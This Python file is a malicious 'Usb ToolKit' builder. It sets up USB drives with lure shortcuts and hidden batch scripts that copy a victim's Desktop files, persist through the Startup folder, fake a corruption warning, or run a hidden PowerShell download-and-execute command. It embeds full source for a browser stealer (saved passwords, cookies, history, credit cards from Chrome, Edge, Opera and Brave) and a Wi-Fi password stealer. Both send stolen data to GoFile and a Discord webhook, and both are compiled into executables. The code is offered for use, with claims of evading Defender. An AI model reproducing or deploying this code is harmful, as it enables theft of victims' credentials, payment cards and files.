# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

global tools
import os
import sys
import subprocess
import re
import shutil
from colorama import init, Fore, Style
from time import sleep
import hashlib
from datetime import datetime, UTC
init()
tools = {
    1: {
        'name': 'Auto-Executor',
        'bat_content': '@echo off
echo Access granted! > %TEMP%\access.txt
start notepad %TEMP%\access.txt
start "" "%~dp0{EXE_NAME}"
{MALWARE}
',
        'lnk_name': 'Private_Documents.lnk',
        'leurre_dir': 'Documents',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to access private documents!' },
    2: {
        'name': 'Data Exfiltrator',
        'bat_content': '@echo off
mkdir "%~dp0Data" >nul 2>&1
for /r "%USERPROFILE%\Desktop" %%f in (*.txt *.docx *.pdf) do copy "%%f" "%~dp0Data" >nul 2>&1
attrib +h "%~dp0Data" >nul 2>&1
echo Data extracted! > %TEMP%\exfil.txt
start notepad %TEMP%\exfil.txt
',
        'lnk_name': 'Backup_Files.lnk',
        'leurre_dir': 'Data',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to backup your files!' },
    3: {
        'name': 'Registry Injector',
        'bat_content': '@echo off
copy "%~dp0{EXE_NAME}" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{EXE_NAME}" >nul 2>&1
attrib -h "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\{EXE_NAME}" >nul 2>&1
echo System configured! > %TEMP%\config.txt
start notepad %TEMP%\config.txt
start "" "%~dp0{EXE_NAME}"
{MALWARE}
',
        'lnk_name': 'System_Config.lnk',
        'leurre_dir': 'Config',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to configure system settings!' },
    4: {
        'name': 'Fake Format',
        'bat_content': '@echo off
echo ERROR: USB drive appears corrupted! Please run repair to fix.
msg * "ERROR: USB drive appears corrupted! Please run repair to fix."
start "" "%~dp0{EXE_NAME}"
{MALWARE}
',
        'repair_content': None,
        'lnk_name': 'Repair_USB.lnk',
        'leurre_dir': 'Repair',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to repair the USB!' } }
def print_cyan(text):
    print(f'{Fore.LIGHTCYAN_EX}{text}{Style.RESET_ALL}')
def input_cyan(prompt):
    return input(f'{Fore.LIGHTCYAN_EX}{prompt}{Style.RESET_ALL}')
def loading_bar(message, duration=2, steps=20):
    """Display a loading bar in LIGHTCYAN_EX."""
    print_cyan(f'[*] {message}...')
    for i in range(steps + 1):
        progress = int(i / steps * 100)
        bar = '█' * (i // 2) + ' ' * ((steps - i) // 2)
        sys.stdout.write(f'[{bar}] {progress}%')
        sys.stdout.flush()
        sleep(duration / steps)
    print('[ OK ]                                         ')
def validate_webhook(url):
    print_cyan(f'[+] Validating webhook: {url}')
    return bool(re.match('https://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+', url))
def validate_usb_path(path):
    if not os.path.exists(path) or not os.path.isdir(path):
        return False
    else:
        try:
            test_file = os.path.join(path, f'test_{os.urandom(4).hex()}.txt')
            with open(test_file, 'w') as f:
                f.write('test')
            os.remove(test_file)
        except PermissionError:
            return False
        return True
def configure_usb(tool_id, usb_path, exe_name, malware_url=''):
    tool = tools[tool_id]
    tool_dir = f"{usb_path}\{tool['leurre_dir']}"
    try:
        os.makedirs(tool_dir, exist_ok=True)
    except PermissionError:
        print_cyan(f'[-] ERROR: Permission denied creating {tool_dir}. Run as admin.')
        return False
    if tool_id!= 2 and exe_name:
            exe_path = os.path.join(os.getcwd(), 'output', exe_name)
            if os.path.exists(exe_path):
                try:
                    os.system(f'copy \"{exe_path}\" \"{tool_dir}\{exe_name}\" >nul 2>&1')
                    if tool_id!= 3:
                        os.system(f'attrib +h \"{tool_dir}\{exe_name}\" >nul 2>&1')
                    else:
                        os.system(f'attrib -h \"{tool_dir}\{exe_name}\" >nul 2>&1')
                except:
                    print_cyan(f'[-] ERROR: Failed to copy or set attributes for {exe_name}.')
                    return False
            else:
                print_cyan(f'[-] ERROR: Executable {exe_path} not found!')
                return False
    bat_file = f"{tool['name'].lower().replace(' ', '_')}.bat"
    bat_content = tool['bat_content'].replace('{EXE_NAME}', exe_name if exe_name else 'none')
    malware_line = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\'{malware_url}\')\"' if malware_url else ''
    bat_content = bat_content.replace('{MALWARE}', malware_line)
    try:
        with open(f'{tool_dir}\{bat_file}', 'w', encoding='utf-8') as f:
            f.write(bat_content)
        os.system(f'attrib +h \"{tool_dir}\{bat_file}\" >nul 2>&1')
    except PermissionError:
        print_cyan(f'[-] ERROR: Permission denied writing {bat_file}. Run as admin.')
        return False
    if tool['lnk_name']:
        lnk_content = f"Set WShell = CreateObject(\"WScript.Shell\")
Set Lnk = WShell.CreateShortcut(\"{usb_path}\{tool['lnk_name']}\")
Lnk.TargetPath = \"{tool_dir}\{bat_file}\"
Lnk.IconLocation = \"%SystemRoot%\explorer.exe,0\"
Lnk.Save"
        try:
            with open(f'{tool_dir}\lnk.vbs', 'w', encoding='utf-8') as f:
                f.write(lnk_content)
            os.system(f'cscript \"{tool_dir}\lnk.vbs\" >nul 2>&1 && attrib +h \"{tool_dir}\lnk.vbs\" >nul 2>&1')
        except:
            print_cyan(f"[-] ERROR: Failed to create shortcut for {tool['name']}.")
            return False
    if tool['leurre_dir']:
        try:
            os.makedirs(f'{tool_dir}', exist_ok=True)
            with open(f"{tool_dir}\{tool['leurre_file']}", 'w', encoding='utf-8') as f:
                f.write(tool['leurre_content'])
        except PermissionError:
            print_cyan('[-] ERROR: Permission denied creating lure directory. Run as admin.')
            return False
    print_cyan(f"[*] USB configured with {tool['name']} at {tool_dir}")
    return True
def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_cyan('======================================================================')
    print_cyan('
 __    __            __              ________                    __  __    __  __    __     
|  \  |  \          |  \            |        \                  |  \|  \  /  \|  \  |  \    
| $$  | $$  _______ | $$____         \$$$$$$$$______    ______  | $$| $$ /  $$ \$$ _| $$_   
| $$  | $$ /       \| $$    \          | $$  /      \  /      \ | $$| $$/  $$ |  \|   $$ \  
| $$  | $$|  $$$$$$$| $$$$$$$\         | $$ |  $$$$$$\|  $$$$$$\| $$| $$  $$  | $$ \$$$$$$  
| $$  | $$ \$$    \ | $$  | $$         | $$ | $$  | $$| $$  | $$| $$| $$$$$\  | $$  | $$ __ 
| $$__/ $$ _\$$$$$$\| $$__/ $$         | $$ | $$__/ $$| $$__/ $$| $$| $$ \$$\ | $$  | $$|  \
 \$$    $$|       $$| $$    $$         | $$  \$$    $$ \$$    $$| $$| $$  \$$\| $$   \$$  $$
  \$$$$$$  \$$$$$$$  \$$$$$$$           \$$   \$$$$$$   \$$$$$$  \$$ \$$   \$$ \$$    \$$$$ 
                                                                                            
                                                                                            
    ')
    print_cyan('=============== Usb ToolKit v1.8 ===============')
    print_cyan('[*] Undetectable by Defender')
    print_cyan('[*] Select USB tool and malware (Browser/Wi-Fi Stealer or Custom)')
    print_cyan('[*] Sends stealer data to Discord via GoFile')
    print_cyan('[*] Configures USB for stealth execution')
    print_cyan('================================================================')
    print()
    print_cyan('Select USB tool:')
    print_cyan('[1] USB Auto-Executor    : Run script on click')
    print_cyan('[2] USB Data Exfiltrator : Steal files silently')
    print_cyan('[3] USB Registry Injector: Persist on boot')
    print_cyan('[4] USB Fake Format      : Fake corruption trick')
    try:
        tool_choice = int(input_cyan('Enter tool number (1-4): '))
        if tool_choice not in range(1, 5):
            print_cyan('[!] Invalid tool choice. Exiting.')
            sys.exit(1)
    except ValueError:
        print_cyan('[!] Invalid input. Exiting.')
        sys.exit(1)
    if tool_choice == 2:
        exe_name = None
        malware_url = ''
    else:
        print_cyan('
Select malware type:')
        print_cyan('[1] Browser Stealer (Passwords, Cookies, History, Credit Cards)')
        print_cyan('[2] Wi-Fi Stealer (Wi-Fi Passwords)')
        print_cyan('[3] Custom Malware (Provide your own .exe)')
        try:
            malware_choice = int(input_cyan('Enter malware choice (1-3): '))
            if malware_choice not in range(1, 4):
                print_cyan('[!] Invalid malware choice. Exiting.')
                sys.exit(1)
        except ValueError:
            print_cyan('[!] Invalid input. Exiting.')
            sys.exit(1)
        webhook_url = ''
        if malware_choice in (1, 2):
            webhook_url = input_cyan('Enter Discord webhook URL: ').strip()
            if not validate_webhook(webhook_url):
                print_cyan('[-] ERROR: Invalid Discord webhook URL! Example: https://discord.com/api/webhooks/...')
                sys.exit(1)
        else:
            malware_path = input_cyan('Enter path to custom .exe (e.g., C:\malware.exe): ').strip()
            if not os.path.exists(malware_path) or not malware_path.endswith('.exe'):
                print_cyan('[!] Invalid .exe path. Exiting.')
                sys.exit(1)
    print_cyan('Enter USB drive path (e.g., E:\): ')
    usb_path = input_cyan('').strip()
    if not validate_usb_path(usb_path):
        print_cyan('[!] Invalid USB path or no write access. Run as admin.')
        sys.exit(1)
    print_cyan('Enter malware URL (or press Enter to skip): ')
    malware_url = input_cyan('').strip() if tool_choice!= 2 else ''
    browser_stealer_code = '# browser_stealer.py
import base64
import os
import sqlite3
import tempfile
import requests
import aiohttp
import asyncio
import json
import sys
from pathlib import Path
from win32crypt import CryptUnprotectData
from datetime import datetime, UTC
from Cryptodome.Cipher import AES
if sys.platform == \"win32\":
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(\"\")
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
DISCORD_WEBHOOK_URL = \"{webhook_url}\"
GOFILE_API_URL = \"https://upload.gofile.io/uploadFile\"
DOWNLOAD_DIR = Path(tempfile.gettempdir()) / \".bx1_stolen_data\"
def get_master_key(local_state_path):
    try:
        with open(local_state_path, \"r\", encoding=\"utf-8\") as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])
        key = key[5:]
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except:
        return None
def decrypt_value(encrypted_value, key):
    try:
        if encrypted_value[:3] == b\"v10\":
            encrypted_value = encrypted_value[3:]
            iv = encrypted_value[:12]
            ciphertext = encrypted_value[12:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode(\"utf-8\")
        else:
            return CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(\"utf-8\")
    except:
        return \"N/A\"
def copy_and_open_db(db_path):
    try:
        tmp_file = Path(tempfile.mktemp())
        with open(db_path, \"rb\") as f:
            with open(tmp_file, \"wb\") as tmp:
                tmp.write(f.read())
        conn = sqlite3.connect(tmp_file)
        return conn, tmp_file
    except:
        return None, None
def upload_to_gofile(file_path):
    file_path = Path(file_path).resolve()
    if not file_path.exists():
        return \"File not found\"
    with open(file_path, \"rb\") as f:
        files = {\"file\": f}
        try:
            response = requests.post(GOFILE_API_URL, files=files, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data.get(\"status\") == \"ok\":
                return data[\"data\"][\"downloadPage\"]
            else:
                return f\"Gofile error: {data.get(\'data\', {}).get(\'message\', \'Unknown error\')}\"
        except requests.exceptions.RequestException as e:
            return f\"Upload failed: {str(e)}\"
async def send_to_discord(webhook_url, embed):
    async with aiohttp.ClientSession() as session:
        try:
            data = {\"embeds\": [embed]}
            async with session.post(webhook_url, json=data, timeout=10) as resp:
                pass
        except:
            pass
async def main():
    browsers = {
        \"Chrome\": Path.home() / \"AppData/Local/Google/Chrome/User Data/Default\",
        \"Edge\": Path.home() / \"AppData/Local/Microsoft/Edge/User Data/Default\",
        \"Opera\": Path.home() / \"AppData/Roaming/Opera Software/Opera Stable\",
        \"Brave\": Path.home() / \"AppData/Local/BraveSoftware/Brave-Browser/User Data/Default\",
    }
    data = {}
    for browser, path in browsers.items():
        if not path.exists():
            continue
        local_state = path.parent / \"Local State\"
        if not local_state.exists():
            continue
        key = get_master_key(local_state)
        if not key:
            continue
        data[browser] = {}
        login_db = path / \"Login Data\"
        if login_db.exists():
            conn, tmp_copy = copy_and_open_db(login_db)
            if conn:
                cursor = conn.cursor()
                cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\")
                logins = cursor.fetchall()
                conn.close()
                tmp_copy.unlink()
                if logins:
                    data[browser][\"logins\"] = [(url, user, decrypt_value(pwd, key)) for url, user, pwd in logins]
        cookies_db = path / \"Cookies\"
        if cookies_db.exists():
            conn, tmp_copy = copy_and_open_db(cookies_db)
            if conn:
                cursor = conn.cursor()
                cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")
                cookies = cursor.fetchall()
                conn.close()
                tmp_copy.unlink()
                if cookies:
                    data[browser][\"cookies\"] = [(host, name, decrypt_value(value, key)) for host, name, value in cookies]
        history_db = path / \"History\"
        if history_db.exists():
            conn, tmp_copy = copy_and_open_db(history_db)
            if conn:
                cursor = conn.cursor()
                cursor.execute(\"SELECT url, title, last_visit_time FROM urls\")
                history = cursor.fetchall()
                conn.close()
                tmp_copy.unlink()
                if history:
                    data[browser][\"history\"] = [(url, title, datetime.fromtimestamp(last_visit_time / 1000000 - 11644473600).strftime(\'%Y-%m-%d %H:%M:%S\')) for url, title, last_visit_time in history]
        webdata_db = path / \"Web Data\"
        if webdata_db.exists():
            conn, tmp_copy = copy_and_open_db(webdata_db)
            if conn:
                cursor = conn.cursor()
                cursor.execute(\"SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards\")
                cards = cursor.fetchall()
                conn.close()
                tmp_copy.unlink()
                if cards:
                    data[browser][\"cards\"] = [(name, decrypt_value(number, key), f\"{month}/{year}\") for name, number, month, year in cards]
    DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)
    if sys.platform == \"win32\":
        ctypes.windll.kernel32.SetFileAttributesW(str(DOWNLOAD_DIR), 2)
    for browser, info in data.items():
        embed = {
            \"title\": f\"**{browser} Stolen Data**\",
            \"color\": 0xFF0000,
            \"fields\": [],
            \"timestamp\": datetime.now(UTC).isoformat()
        }
        for category, items in info.items():
            filename = f\"{browser}_{category}.txt\"
            try:
                with open(DOWNLOAD_DIR / filename, \'w\', encoding=\'utf-8\') as f:
                    for item in items:
                        if category == \"logins\":
                            f.write(f\"URL: {item[0]}\\nUsername: {item[1]}\\nPassword: {item[2]}\\n\\n\")
                        elif category == \"cookies\":
                            f.write(f\"Host: {item[0]}\\nName: {item[1]}\\nValue: {item[2]}\\n\\n\")
                        elif category == \"history\":
                            f.write(f\"Title: {item[1]}\\nURL: {item[0]}\\nLast Visit: {item[2]}\\n\\n\")
                        elif category == \"cards\":
                            f.write(f\"Name: {item[0]}\\nNumber: {item[1]}\\nExp: {item[2]}\\n\\n\")
                download_link = upload_to_gofile(DOWNLOAD_DIR / filename)
                embed[\"fields\"].append({\"name\": category.capitalize(), \"value\": f\"[Download]({download_link})\", \"inline\": False})
                (DOWNLOAD_DIR / filename).unlink(missing_ok=True)
            except:
                embed[\"fields\"].append({\"name\": category.capitalize(), \"value\": \"[Upload failed]\", \"inline\": False})
        await send_to_discord(DISCORD_WEBHOOK_URL, embed)
if __name__ == \"__main__\":
    asyncio.run(main())
    sys.exit(0)
'
    wifi_stealer_code = '# wifi_stealer.py
import subprocess
import re
import sys
import os
import ctypes
import tempfile
import requests
import aiohttp
import asyncio
from datetime import datetime
from pathlib import Path
if sys.platform == \"win32\":
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(\"\")
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
DISCORD_WEBHOOK_URL = \"{webhook_url}\"
GOFILE_API_URL = \"https://upload.gofile.io/uploadFile\"
TEMP_DIR = Path(tempfile.gettempdir()) / \".wifi_stolen_data\"
ENCODINGS = (\"utf-8\", \"mbcs\", \"cp1252\", \"cp850\")
def try_decodings(b):
    out = {}
    if not b:
        for e in ENCODINGS:
            out[e] = \"\"
        return out
    if isinstance(b, str):
        for e in ENCODINGS:
            out[e] = b
        return out
    for e in ENCODINGS:
        try:
            out[e] = b.decode(e)
        except Exception:
            out[e] = \"\"
    return out
def run_netsh_bytes(args, shell=False):
    try:
        if shell:
            completed = subprocess.run(args, capture_output=True, check=True, shell=True)
        else:
            completed = subprocess.run(args, capture_output=True, check=True, shell=False)
        return completed.stdout
    except subprocess.CalledProcessError as e:
        return e.stdout or b\"\"
def extract_key_from_text(text):
    patterns = [
        r\"Key Content\s*:\s*(.*)\",
        r\"Contenu de la clé\s*:\s*(.*)\",
        r\"Contenido de la clave\s*:\s*(.*)\",
        r\"Clave\s*:\s*(.*)\",
        r\"Key\s*:\s*(.*)\"
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1).strip().strip(\'\"\')
    return None
def list_profiles():
    b = run_netsh_bytes([\"netsh\", \"wlan\", \"show\", \"profiles\"], shell=False)
    decs = try_decodings(b)
    found = []
    for txt in decs.values():
        for line in txt.splitlines():
            line_clean = line.replace(\"\u00A0\", \" \").strip()
            if \":\" not in line_clean:
                continue
            left, right = line_clean.split(\":\", 1)
            left_low = left.strip().lower()
            if (\"profile\" in left_low) or (\"profil\" in left_low) or (\"utilisateur\" in left_low):
                candidate = right.strip().strip(\'\"\').strip()
                if candidate and candidate not in found:
                    found.append(candidate)
    if not found:
        b = run_netsh_bytes([\"netsh\", \"wlan\", \"show\", \"interfaces\"], shell=False)
        decs = try_decodings(b)
        for txt in decs.values():
            if \"not \" in txt.lower():
                return []
        return []
    return sorted(found)
def get_current_ssid():
    b = run_netsh_bytes([\"netsh\", \"wlan\", \"show\", \"interfaces\"], shell=False)
    decs = try_decodings(b)
    for txt in decs.values():
        for line in txt.splitlines():
            line_clean = line.replace(\"\u00A0\", \" \").strip()
            m = re.search(r\"SSID\s*:\s*(.+)\", line_clean, re.IGNORECASE)
            if m:
                return m.group(1).strip().strip(\'\"\')
    return None
def get_password_for_profile(profile):
    args_list = [\"netsh\", \"wlan\", \"show\", \"profile\", f\"name={profile}\", \"key=clear\"]
    b = run_netsh_bytes(args_list, shell=False)
    decs = try_decodings(b)
    for enc, txt in decs.items():
        key = extract_key_from_text(txt)
        if key:
            return key
    cmd_shell = f\'netsh wlan show profile name=\"{profile}\" key=clear\'
    b2 = run_netsh_bytes(cmd_shell, shell=True)
    decs2 = try_decodings(b2)
    for enc, txt in decs2.items():
        key = extract_key_from_text(txt)
        if key:
            return key
    return None
def save_temp(results):
    TEMP_DIR.mkdir(parents=True, exist_ok=True)
    filename = TEMP_DIR / \"wifi_passwords.txt\"
    try:
        with open(filename, \"w\", encoding=\"utf-8\") as f:
            f.write(f\"# Wi-Fi Stolen - {datetime.now().isoformat()}\n\n\")
            for ssid, pwd in results:
                f.write(f\"Wi-Fi: {ssid}\nMot de passe: {pwd if pwd else \'(non disponible)\'}\n{\'-\'*40}\n\")
        if sys.platform == \"win32\":
            ctypes.windll.kernel32.SetFileAttributesW(str(TEMP_DIR), 2)
            ctypes.windll.kernel32.SetFileAttributesW(str(filename), 2)
        return filename
    except:
        return None
def upload_to_gofile(file_path):
    file_path = Path(file_path).resolve()
    if not file_path.exists():
        return \"Fichier introuvable\"
    with open(file_path, \"rb\") as f:
        files = {\"file\": f}
        try:
            response = requests.post(GOFILE_API_URL, files=files, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data.get(\"status\") == \"ok\":
                return data[\"data\"][\"downloadPage\"]
            else:
                return f\"Erreur GoFile: {data.get(\'data\', {}).get(\'message\', \'Erreur inconnue\')}\"
        except requests.exceptions.RequestException as e:
            return f\"Échec upload: {str(e)}\"
async def send_to_discord(webhook_url, embed):
    async with aiohttp.ClientSession() as session:
        try:
            data = {\"embeds\": [embed]}
            async with session.post(webhook_url, json=data, timeout=10) as resp:
                pass
        except:
            pass
async def main():
    if sys.platform == \"win32\":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    only_current = (len(sys.argv) > 1 and sys.argv[1] == \"--current\")
    results = []
    if only_current:
        ssid = get_current_ssid()
        if not ssid:
            return
        pwd = get_password_for_profile(ssid)
        results.append((ssid, pwd))
    else:
        profiles = list_profiles()
        if not profiles:
            return
        for p in profiles:
            pwd = get_password_for_profile(p)
            results.append((p, pwd))
    fname = save_temp(results)
    if not fname:
        return
    download_link = upload_to_gofile(fname)
    embed = {
        \"title\": \"**Wi-Fi Stolen Data**\",
        \"color\": 0xFF0000,
        \"fields\": [{\"name\": \"Wi-Fi Passwords\", \"value\": f\"[Download]({download_link})\", \"inline\": False}],
        \"timestamp\": datetime.now().isoformat()
    }
    await send_to_discord(DISCORD_WEBHOOK_URL, embed)
    try:
        fname.unlink()
    except:
        pass
if __name__ == \"__main__\":
    asyncio.run(main())
    sys.exit(0)
'
    exe_name = ''
    temp_script_path = ''
    if tool_choice!= 2:
        if malware_choice in (1, 2):
            stealer_code = browser_stealer_code if malware_choice == 1 else wifi_stealer_code
            exe_name = 'browser_stealer.exe' if malware_choice == 1 else 'wifi_stealer.exe'
            temp_script_path = os.path.join(os.getcwd(), f"{('browser' if malware_choice == 1 else 'wifi')}_stealer_temp.py")
            loading_bar('Checking PyInstaller', duration=1)
            result = subprocess.run(['pyinstaller', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode!= 0:
                print_cyan(f'[-] ERROR: PyInstaller not found or inaccessible: {result.stderr}')
                print_cyan('[*] Install it with: pip install pyinstaller')
                sys.exit(1)
            print_cyan(f'[+] PyInstaller found, version: {result.stdout.strip()}')
            output_folder = os.path.join(os.getcwd(), 'output')
            os.makedirs(output_folder, exist_ok=True)
            exe_path = os.path.join(output_folder, exe_name)
            print_cyan(f'[+] Output folder created: {output_folder}')
            loading_bar('Writing temporary stealer file', duration=1)
            try:
                stealer_code_with_webhook = stealer_code.replace('{webhook_url}', webhook_url)
                with open(temp_script_path, 'w', encoding='utf-8') as f:
                    f.write(stealer_code_with_webhook)
            except Exception as e:
                print_cyan(f'[-] ERROR: Failed to write {temp_script_path}: {str(e)}')
                sys.exit(1)
            if not os.path.exists(temp_script_path):
                print_cyan(f'[-] ERROR: Temporary file {temp_script_path} not created!')
                sys.exit(1)
            if os.path.getsize(temp_script_path) == 0:
                print_cyan(f'[-] ERROR: Temporary file {temp_script_path} is empty!')
                sys.exit(1)
            print_cyan(f'[+] Temporary file written, size: {os.path.getsize(temp_script_path)} bytes')
            loading_bar('Verifying webhook in temporary file', duration=1)
            try:
                with open(temp_script_path, 'r', encoding='utf-8') as temp_file:
                    content = temp_file.read()
                    if webhook_url not in content:
                        print_cyan(f'[-] ERROR: Webhook {webhook_url} not found in {temp_script_path}!')
                        sys.exit(1)
                    print_cyan('[+] Webhook verified')
            except Exception as e:
                print_cyan(f'[-] ERROR: Failed to read {temp_script_path}: {str(e)}')
                sys.exit(1)
            loading_bar(f"Compiling {('Browser' if malware_choice == 1 else 'Wi-Fi')} Stealer to .exe", duration=3)
            command = ['pyinstaller', '--onefile', '--windowed', temp_script_path]
            result = subprocess.run(command, capture_output=True, text=True)
            if result.returncode!= 0:
                print_cyan(f'[-] ERROR: Compilation failed: {result.stderr}')
                print_cyan(f'[+] PyInstaller stdout: {result.stdout}')
                print_cyan(f'[*] Temporary file {temp_script_path} kept for debugging.')
                sys.exit(1)
            print_cyan('[+] Compilation completed')
            dist_exe = os.path.join('dist', os.path.basename(temp_script_path).replace('.py', '.exe'))
            if os.path.exists(dist_exe):
                if os.path.exists(exe_path):
                    print_cyan(f'[+] Deleting old executable: {exe_path}')
                    os.remove(exe_path)
                print_cyan(f'[+] Moving {dist_exe} to {exe_path}')
                shutil.move(dist_exe, exe_path)
            else:
                print_cyan(f'[-] ERROR: {os.path.basename(dist_exe)} not found in dist/!')
                print_cyan(f'[*] Temporary file {temp_script_path} kept for debugging.')
                sys.exit(1)
            loading_bar('Cleaning up temporary files', duration=1)
            try:
                print_cyan(f'[+] Deleting {temp_script_path}')
                os.remove(temp_script_path)
                spec_path = os.path.join(os.getcwd(), os.path.basename(temp_script_path).replace('.py', '.spec'))
                if os.path.exists(spec_path):
                    print_cyan(f'[+] Deleting {spec_path}')
                    os.remove(spec_path)
                print_cyan('[+] Deleting build and dist folders')
                shutil.rmtree('build', ignore_errors=True)
                shutil.rmtree('dist', ignore_errors=True)
            except Exception as e:
                print_cyan(f'[*] Some temporary files could not be deleted: {str(e)}')
        else:
            exe_name = os.path.basename(malware_path)
            exe_path = os.path.join(os.getcwd(), 'output', exe_name)
            os.makedirs(os.path.dirname(exe_path), exist_ok=True)
            try:
                shutil.copy(malware_path, exe_path)
                print_cyan(f'[+] Copied custom malware to {exe_path}')
            except Exception as e:
                print_cyan(f'[-] ERROR: Failed to copy {malware_path}: {str(e)}')
                sys.exit(1)
    loading_bar('Configuring USB key', duration=2)
    if configure_usb(tool_choice, usb_path, exe_name, malware_url):
        print_cyan(f"[+] USB ready with {tools[tool_choice]['name']}" + (f" and {['Browser Stealer', 'Wi-Fi Stealer', 'Custom Malware'][malware_choice - 1]}" if tool_choice!= 2 else ''))
    else:
        print_cyan('[!] USB configuration failed. Run as admin.')
    loading_bar('Operation Complete', duration=1)
    print_cyan('[!] Warning: Truth revealed, no turning back.')
if __name__ == '__main__':
    main()
